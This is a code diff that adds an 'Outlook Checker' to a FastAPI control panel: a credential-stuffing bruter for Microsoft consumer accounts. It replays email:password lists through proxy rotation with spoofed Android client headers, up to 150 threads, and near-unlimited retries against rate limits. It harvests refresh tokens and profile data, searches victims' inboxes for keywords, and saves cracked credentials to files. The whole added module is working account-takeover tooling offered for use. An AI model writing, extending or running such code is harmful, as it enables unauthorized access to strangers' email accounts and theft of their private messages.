@@ -644,6 +644,524 @@ async def api_logs_snapshot(
 
 
 # --------------------------------------------------------------------------- #
+# Outlook Checker — OAuth2 bruter + inbox searcher
+# --------------------------------------------------------------------------- #
+import urllib.parse as _up
+
+_MSFT_CLIENT_ID    = "0000000048170EF2"
+_MSFT_REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
+_MSFT_TENANT_CONS  = "consumers"
+_MSFT_TENANT_ID    = "9188040d-6c67-4c5b-b112-36a304b66dad"
+_MSFT_UA_BROWSER   = (
+    "Mozilla/5.0 (Linux; Android 12; SM-G988N Build/NRD90M; wv) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.0.0 Mobile Safari/537.36"
+)
+_MSFT_UA_MSAL    = "Mozilla/5.0 (compatible; MSAL 1.0)"
+_MSFT_UA_DALVIK  = "Dalvik/2.1.0 (Linux; U; Android 12; SM-G988N Build/NRD90M)"
+_MSFT_SCOPE_LOGIN = "offline_access openid profile service::outlook.office.com::MBI_SSL"
+_MSFT_SCOPE_EWS   = (
+    "offline_access https://outlook.office.com/IMAP.AccessAsUser.All "
+    "https://outlook.office.com/SMTP.Send https://outlook.office.com/EWS.AccessAsUser.All"
+)
+_MSFT_MSAL_HDR = {
+    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+    "User-Agent": _MSFT_UA_MSAL,
+    "client-request-id": "3d0f0eea-617a-4b9c-a747-100934dca583",
+    "return-client-request-id": "false",
+}
+_MSFT_TIMEOUT = 20
+
+_OUTLOOK_RESULTS_FILE = ROOT / "outlook_results.txt"
+
+_OUTLOOK_STATE: Dict[str, Any] = {
+    "running": False, "done": False, "total": 0,
+    "hits": 0, "bad": 0, "found": 0, "retries": 0,
+    "results": [], "error": "", "mode": "bruter",
+    "keyword": "", "started_at": None, "finished_at": None,
+}
+_OUTLOOK_LOCK = threading.Lock()
+_OUTLOOK_STOP = threading.Event()
+
+
+class OutlookBody(BaseModel):
+    accounts: List[str] = Field(..., min_length=1)
+    mode: str = Field("bruter", pattern="^(bruter|inboxer)$")
+    keyword: Optional[str] = None
+    proxy_file: Optional[str] = None
+    workers: Optional[int] = None
+
+
+def _outlook_reset(total: int, mode: str, keyword: str) -> None:
+    with _OUTLOOK_LOCK:
+        _OUTLOOK_STATE.update(
+            running=True, done=False, total=total,
+            hits=0, bad=0, found=0, retries=0,
+            results=[], error="", mode=mode, keyword=keyword,
+            started_at=time.time(), finished_at=None,
+        )
+        _OUTLOOK_STOP.clear()
+
+
+def _outlook_add_result(email: str, password: str, status: str,
+                        name: str, country: str, found: int) -> None:
+    with _OUTLOOK_LOCK:
+        existing = next(
+            (i for i, r in enumerate(_OUTLOOK_STATE["results"]) if r["email"] == email), None
+        )
+        entry = {"email": email, "password": password, "status": status,
+                 "name": name, "country": country, "found": found}
+        if existing is not None:
+            old = _OUTLOOK_STATE["results"][existing]
+            if old["status"] == "hit":   _OUTLOOK_STATE["hits"]  = max(0, _OUTLOOK_STATE["hits"] - 1)
+            elif old["status"] == "bad": _OUTLOOK_STATE["bad"]   = max(0, _OUTLOOK_STATE["bad"]  - 1)
+            if old.get("found", 0) > 0:  _OUTLOOK_STATE["found"] = max(0, _OUTLOOK_STATE["found"] - 1)
+            _OUTLOOK_STATE["results"][existing] = entry
+        else:
+            _OUTLOOK_STATE["results"].append(entry)
+        if status == "hit":
+            _OUTLOOK_STATE["hits"] += 1
+        else:
+            _OUTLOOK_STATE["bad"] += 1
+        if found > 0:
+            _OUTLOOK_STATE["found"] += 1
+
+
+def _msft_login_page(session, email: str) -> Optional[Dict[str, str]]:
+    """Fetch MS login page, return {url_post, ppft, nonce} or None."""
+    url = (
+        f"https://login.live.com/oauth20_authorize.srf"
+        f"?client_id={_MSFT_CLIENT_ID}"
+        f"&scope={_up.quote(_MSFT_SCOPE_LOGIN)}"
+        f"&redirect_uri={_up.quote(_MSFT_REDIRECT_URI)}"
+        f"&response_type=code&login_hint={_up.quote(email)}"
+        f"&x-client-SKU=MSAL.xplat.android&x-client-Ver=1.1.0+ad8a8025"
+        f"&uaid={int(time.time())}&msproxy=1&issuer=mso&tenant=consumers"
+        f"&ui_locales=en-US&client_info=1&haschrome=1&passKeyAuth=1.0/passkey"
+    )
+    try:
+        r = session.get(url, headers={"User-Agent": _MSFT_UA_BROWSER},
+                        allow_redirects=True, timeout=_MSFT_TIMEOUT)
+        md = re.search(r'var ServerData\s*=\s*(\{.*?\});\s*</script>', r.text, re.DOTALL) \
+             or re.search(r'var ServerData\s*=\s*(\{.*?\});', r.text, re.DOTALL)
+        if not md:
+            return None
+        sd = json.loads(md.group(1))
+        url_post = sd.get("urlPost", "")
+        ppft_m   = re.search(r'value="([^"]*)"', sd.get("sFTTag", ""))
+        ppft     = ppft_m.group(1) if ppft_m else ""
+        if not url_post or not ppft:
+            return None
+        return {"url_post": url_post, "ppft": ppft, "nonce": sd.get("sNGCNonce", "")}
+    except Exception:
+        return None
+
+
+def _msft_submit_creds(session, url_post: str, ppft: str, nonce: str,
+                        email: str, password: str) -> Optional[str]:
+    """POST credentials, return auth code or None (bad password / block)."""
+    payload = {
+        "ps": "2", "psRNGCDefaultType": "1", "psRNGCEntropy": "", "psRNGCSLK": "",
+        "canary": "", "ctx": nonce, "hpgrequestid": "",
+        "PPFT": ppft, "PPSX": "Pas", "NewUser": "1", "FoundMSAs": "",
+        "fspost": "0", "i21": "0", "CookieDisclosure": "0",
+        "IsFidoSupported": "0", "isSignupPost": "0", "isRecoveryAttemptPost": "0",
+        "i13": "1", "login": email, "loginfmt": email,
+        "type": "11", "LoginOptions": "1",
+        "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
+        "passwd": password,
+    }
+    try:
+        r = session.post(url_post, data=payload,
+                         headers={"User-Agent": _MSFT_UA_BROWSER},
+                         allow_redirects=False, timeout=_MSFT_TIMEOUT)
+    except Exception:
+        return None
+    if r.status_code == 429:
+        return None
+    location = r.headers.get("Location", "")
+    if not location and r.status_code == 200:
+        act = re.search(r'action="([^"]+)"', r.text)
+        if act:
+            fields = re.findall(r'name="([^"]+)"\s+value="([^"]*)"', r.text)
+            try:
+                r2 = session.post(act.group(1), data={k: v for k, v in fields},
+                                   allow_redirects=True, timeout=_MSFT_TIMEOUT)
+                location = r2.url
+            except Exception:
+                pass
+    if not location:
+        return None
+    code = _up.parse_qs(_up.urlparse(location).query).get("code", [""])[0]
+    if not code:
+        m = re.search(r'code=([^&]+)', location)
+        code = m.group(1) if m else ""
+    return code or None
+
+
+def _msft_exchange_code(session, code: str) -> Optional[Dict[str, str]]:
+    """Exchange auth code → {refresh_token, substrate_token}."""
+    r = session.post(
+        f"https://login.microsoftonline.com/{_MSFT_TENANT_CONS}/oauth2/v2.0/token",
+        data={"client_info": "1", "client_id": _MSFT_CLIENT_ID,
+              "redirect_uri": _MSFT_REDIRECT_URI, "grant_type": "authorization_code",
+              "code": code, "scope": _MSFT_SCOPE_LOGIN},
+        headers=_MSFT_MSAL_HDR, timeout=_MSFT_TIMEOUT,
+    )
+    if r.status_code != 200:
+        return None
+    rt = r.json().get("refresh_token", "")
+    if not rt:
+        return None
+    try:
+        session.get(
+            f"https://odc.officeapps.live.com/odc/v2.1/federationprovider?domain={_MSFT_TENANT_ID}",
+            headers={"Host": "odc.officeapps.live.com", "User-Agent": _MSFT_UA_DALVIK},
+            timeout=15,
+        )
+    except Exception:
+        pass
+    r2 = session.post(
+        f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
+        data={"client_info": "1", "client_id": _MSFT_CLIENT_ID, "refresh_token": rt,
+              "scope": f"profile openid offline_access https://substrate.office.com/.default",
+              "grant_type": "refresh_token"},
+        headers=_MSFT_MSAL_HDR, timeout=_MSFT_TIMEOUT,
+    )
+    st = r2.json().get("access_token", "") if r2.status_code == 200 else ""
+    return {"refresh_token": rt, "substrate_token": st}
+
+
+def _msft_get_profile(session, substrate_token: str, email: str,
+                       mspcid: str) -> Tuple[str, str]:
+    """Fetch display name + country via substrate. Returns ('', '') on failure."""
+    try:
+        anchor = f"CID:{mspcid}" if mspcid else f"UPN:{email}"
+        r = session.get(
+            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
+            headers={"Accept": "application/json",
+                     "Authorization": f"Bearer {substrate_token}",
+                     "Host": "substrate.office.com",
+                     "User-Agent": _MSFT_UA_DALVIK,
+                     "X-AnchorMailbox": anchor,
+                     "X-ClientRequestId": "3d0f0eea-617a-4b9c-a747-100934dca583"},
+            timeout=_MSFT_TIMEOUT,
+        )
+        d = r.json() if r.status_code == 200 else {}
+        name = ""
+        if d.get("names"):
+            name = (d["names"][0].get("displayNameDefault") or
+                    d["names"][0].get("displayName") or "")
+        name = name or d.get("displayName", "")
+        country = ""
+        if d.get("accounts"):
+            country = d["accounts"][0].get("location", "")
+        country = country or d.get("country", "")
+        return name, country
+    except Exception:
+        return "", ""
+
+
+def _msft_search_inbox(session, refresh_token: str, email: str,
+                        keyword: str, timeout: int = 30) -> int:
+    """Search inbox for keyword, return match count (0 = not found / error)."""
+    r = session.post(
+        f"https://login.microsoftonline.com/{_MSFT_TENANT_ID}/oauth2/v2.0/token",
+        data={"client_id": _MSFT_CLIENT_ID, "refresh_token": refresh_token,
+              "scope": _MSFT_SCOPE_EWS, "grant_type": "refresh_token"},
+        headers=_MSFT_MSAL_HDR, timeout=_MSFT_TIMEOUT,
+    )
+    at = r.json().get("access_token", "") if r.status_code == 200 else ""
+    if not at:
+        return 0
+    try:
+        r2 = session.post(
+            "https://outlook.office.com/search/api/v2/query",
+            params={"n": "50", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"},
+            json={
+                "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
+                "Scenario": {"Name": "owa.react"},
+                "TimeZone": "Europe/Berlin",
+                "TextDecorations": "Off",
+                "EntityRequests": [{
+                    "EntityType": "Conversation",
+                    "ContentSources": ["Exchange"],
+                    "Filter": {"Or": [
+                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
+                    ]},
+                    "From": 0,
+                    "Query": {"QueryString": keyword},
+                    "Size": 25,
+                    "Sort": [{"Field": "Score", "SortDirection": "Desc", "Count": 3},
+                              {"Field": "Time", "SortDirection": "Desc"}],
+                    "EnableTopResults": True, "TopResultsCount": 3,
+                }],
+                "QueryAlterationOptions": {
+                    "EnableSuggestion": True, "EnableAlteration": True,
+                    "SupportedRecourseDisplayTypes": ["Suggestion", "NoResultModification",
+                        "NoResultFolderRefinerModification", "NoRequeryModification", "Modification"],
+                },
+                "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
+            },
+            headers={
+                "Accept": "application/json",
+                "Authorization": f"Bearer {at}",
+                "Content-Type": "application/json",
+                "Host": "outlook.office.com",
+                "User-Agent": "Outlook-Android/4.618.3",
+                "X-AnchorMailbox": f"UPN:{email}",
+            },
+            timeout=timeout,
+        )
+        total = 0
+        for es in (r2.json() if r2.status_code == 200 else {}).get("EntitySets", []):
+            for rs in es.get("ResultSets", []):
+                total = rs.get("Total", total)
+        return total
+    except Exception:
+        return 0
+
+
+def _run_outlook_account(email: str, password: str, proxy: Optional[Dict],
+                          mode: str, keyword: str) -> None:
+    """Run one account: brute + optional inbox search. Updates _OUTLOOK_STATE."""
+    import requests as _rq
+    session = _rq.Session()
+    if proxy:
+        session.proxies.update(proxy)
+    session.headers["User-Agent"] = _MSFT_UA_BROWSER
+
+    max_retries = 9_999_999
+    for attempt in range(max_retries):
+        if _OUTLOOK_STOP.is_set():
+            with _OUTLOOK_LOCK:
+                _OUTLOOK_STATE["bad"] += 1
+            return
+
+        try:
+            page = _msft_login_page(session, email)
+            if not page:
+                with _OUTLOOK_LOCK:
+                    _OUTLOOK_STATE["retries"] += 1
+                time.sleep(0.5)
+                continue
+
+            code = _msft_submit_creds(session, page["url_post"], page["ppft"],
+                                       page["nonce"], email, password)
+            if code == "":
+                # 429 / rate limited
+                with _OUTLOOK_LOCK:
+                    _OUTLOOK_STATE["retries"] += 1
+                time.sleep(1.0)
+                continue
+            if not code:
+                # Bad password / not found
+                _outlook_add_result(email, password, "bad", "", "", 0)
+                _append_log(f"[-] outlook bad: {email}")
+                return
+
+            tokens = _msft_exchange_code(session, code)
+            if not tokens or not tokens.get("refresh_token"):
+                _outlook_add_result(email, password, "bad", "", "", 0)
+                _append_log(f"[-] outlook no token: {email}")
+                return
+
+            # Extract MSPCID from session cookies for profile anchor
+            mspcid = ""
+            for ck in session.cookies:
+                if ck.name and "MSPCID" in ck.name.upper():
+                    mspcid = (ck.value or "").upper()
+                    break
+
+            name, country = _msft_get_profile(
+                session, tokens.get("substrate_token", ""), email, mspcid
+            )
+
+            found_count = 0
+            if mode == "inboxer" and keyword:
+                found_count = _msft_search_inbox(session, tokens["refresh_token"],
+                                                  email, keyword)
+                if found_count > 0:
+                    _append_log(f"[+] outlook INBOX HIT: {email} | Found: {found_count} | kw={keyword}")
+                    with open(_OUTLOOK_RESULTS_FILE.parent / "outlook_inbox.txt", "a", encoding="utf-8") as fh:
+                        fh.write(f"{email}:{password} | Name: {name} | Country: {country} | Found: {found_count}\n")
+
+            _outlook_add_result(email, password, "hit", name, country, found_count)
+            _append_log(f"[+] outlook hit: {email} | {name} | {country}")
+
+            with open(_OUTLOOK_RESULTS_FILE, "a", encoding="utf-8") as fh:
+                fh.write(f"{email}:{password} | Name: {name} | Country: {country}\n")
+            return
+
+        except Exception as exc:
+            with _OUTLOOK_LOCK:
+                _OUTLOOK_STATE["retries"] += 1
+            time.sleep(0.5)
+            continue
+
+    _outlook_add_result(email, password, "bad", "", "", 0)
+
+
+def _run_outlook(accounts: List[Tuple[str, str]], mode: str, keyword: str,
+                  proxy_file: Optional[str], workers: int) -> None:
+    """Batch runner. Runs in a background thread."""
+    # Build proxy pool (round-robin)
+    proxies: List[str] = []
+    if proxy_file:
+        is_path = len(proxy_file) < 512 and "\n" not in proxy_file
+        raw = ""
+        if is_path:
+            try:
+                p = Path(proxy_file)
+                if p.is_file():
+                    raw = p.read_text(encoding="utf-8", errors="replace")
+            except OSError:
+                raw = proxy_file
+        else:
+            raw = proxy_file
+        for ln in raw.splitlines():
+            ln = ln.strip().split()[0] if ln.strip() else ""
+            if ln and not ln.startswith("#"):
+                proxies.append(ln)
+
+    _proxy_idx = [0]
+    _proxy_lock = threading.Lock()
+
+    def _parse_proxy_str(s: str) -> Optional[Dict]:
+        s = s.strip()
+        if not s or s.startswith("#"):
+            return None
+        try:
+            if "://" in s:
+                m = re.match(r'(https?|socks[45])://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
+                if m:
+                    return {"http": s, "https": s}
+                return {"http": s, "https": s}
+            parts = s.split(":")
+            if len(parts) == 4:
+                return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
+                        "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
+            if len(parts) == 2:
+                return {"http": f"http://{parts[0]}:{parts[1]}",
+                        "https": f"http://{parts[0]}:{parts[1]}"}
+        except Exception:
+            pass
+        return None
+
+    def _get_proxy() -> Optional[Dict]:
+        if not proxies:
+            return None
+        with _proxy_lock:
+            idx = _proxy_idx[0] % len(proxies)
+            _proxy_idx[0] += 1
+        return _parse_proxy_str(proxies[idx])
+
+    _append_log(f"[*] outlook: starting {len(accounts)} accounts · mode={mode} · workers={workers}")
+    total = len(accounts)
+    done = [0]
+    lock = threading.Lock()
+
+    def _do_one(acc: Tuple[str, str]) -> None:
+        em, pw = acc
+        proxy = _get_proxy()
+        _run_outlook_account(em, pw, proxy, mode, keyword or "")
+        with lock:
+            done[0] += 1
+            pct = done[0] / total * 100
+            with _OUTLOOK_LOCK:
+                h = _OUTLOOK_STATE["hits"]
+                b = _OUTLOOK_STATE["bad"]
+                f = _OUTLOOK_STATE["found"]
+            _append_log(f"[{done[0]:>4}/{total}] ({pct:5.1f}%) {em} → {'HIT' if h else 'bad'}")
+
+    try:
+        with __import__("concurrent.futures", fromlist=["ThreadPoolExecutor"]).ThreadPoolExecutor(
+                max_workers=workers) as pool:
+            futs = {pool.submit(_do_one, acc): acc for acc in accounts}
+            for fut in __import__("concurrent.futures", fromlist=["as_completed"]).as_completed(futs):
+                if _OUTLOOK_STOP.is_set():
+                    pool.shutdown(wait=False, cancel_futures=True)
+                    break
+                try:
+                    fut.result()
+                except Exception:
+                    pass
+    except Exception as exc:
+        with _OUTLOOK_LOCK:
+            _OUTLOOK_STATE["error"] = str(exc)
+    finally:
+        with _OUTLOOK_LOCK:
+            _OUTLOOK_STATE["running"] = False
+            _OUTLOOK_STATE["done"] = True
+            _OUTLOOK_STATE["finished_at"] = time.time()
+        _append_log("[*] outlook: job finished")
+
+
+@app.post("/api/outlook/start")
+async def api_outlook_start(
+    body: OutlookBody, x_access_key: Optional[str] = Header(None)
+) -> Dict[str, Any]:
+    _require_auth(x_access_key)
+    with _OUTLOOK_LOCK:
+        if _OUTLOOK_STATE["running"]:
+            raise HTTPException(status_code=409, detail="outlook job already running")
+    accounts: List[Tuple[str, str]] = []
+    for line in body.accounts:
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        parts = line.split(":", 1)
+        if len(parts) == 2:
+            accounts.append((parts[0].strip(), parts[1].strip()))
+    if not accounts:
+        raise HTTPException(status_code=400, detail="no valid email:password lines")
+    workers = body.workers or (15 if body.mode == "inboxer" else 100)
+    workers = min(max(workers, 1), 150)
+    _outlook_reset(len(accounts), body.mode, body.keyword or "")
+    threading.Thread(
+        target=_run_outlook,
+        args=(accounts, body.mode, body.keyword or "",
+              body.proxy_file, workers),
+        daemon=True,
+    ).start()
+    return {"ok": True, "started": True, "total": len(accounts)}
+
+
+@app.post("/api/outlook/stop")
+async def api_outlook_stop(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
+    _require_auth(x_access_key)
+    _OUTLOOK_STOP.set()
+    _append_log("[!] outlook stop requested from web")
+    return {"ok": True, "stopped": True}
+
+
+@app.get("/api/outlook/status")
+async def api_outlook_status(x_access_key: Optional[str] = Header(None)) -> Dict[str, Any]:
+    _require_auth(x_access_key)
+    with _OUTLOOK_LOCK:
+        return {"ok": True, **_OUTLOOK_STATE}
+
+
+@app.get("/api/outlook/results")
+async def api_outlook_results(
+    x_access_key: Optional[str] = Header(None),
+    kind: str = Query("all", pattern="^(all|hits|inbox)$"),
+) -> Response:
+    _require_auth(x_access_key)
+    if kind == "inbox":
+        p = _OUTLOOK_RESULTS_FILE.parent / "outlook_inbox.txt"
+    else:
+        p = _OUTLOOK_RESULTS_FILE
+    if not p.exists():
+        return Response(content="", media_type="text/plain")
+    text = p.read_text(encoding="utf-8")
+    if kind == "hits":
+        lines = [ln for ln in text.splitlines() if ln.strip()]
+        text = "\n".join(lines)
+    return Response(content=text, media_type="text/plain")
+
+
+# --------------------------------------------------------------------------- #
 # Auth + static frontend
 # --------------------------------------------------------------------------- #
 @app.get("/", include_in_schema=False)
